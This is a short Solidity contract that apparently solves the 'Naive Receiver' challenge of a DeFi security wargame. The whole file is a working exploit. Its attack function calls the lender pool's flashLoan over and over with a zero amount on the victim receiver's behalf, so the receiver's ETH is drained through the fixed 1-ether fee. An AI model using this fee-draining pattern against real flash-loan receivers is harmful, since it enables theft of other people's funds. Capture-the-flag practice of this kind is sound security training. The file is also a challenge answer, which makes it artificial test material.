// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract NaiveReceiverAttacker {
    address payable pool;

    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    uint256 private constant FIXED_FEE = 1 ether;

    constructor(address payable _pool) {
        pool = _pool;
    }

    function attack(address payable _receiver) public {
        uint256 balanceBefore = _receiver.balance;
        for (uint256 i; i < balanceBefore; i += FIXED_FEE) {
            bool success = NaiveReceiverLenderPool(pool).flashLoan(
                FlashLoanReceiver(_receiver),
                ETH,
                0,
                ""
            );
            if (!success) {
                break;
            }
        }
    }
}
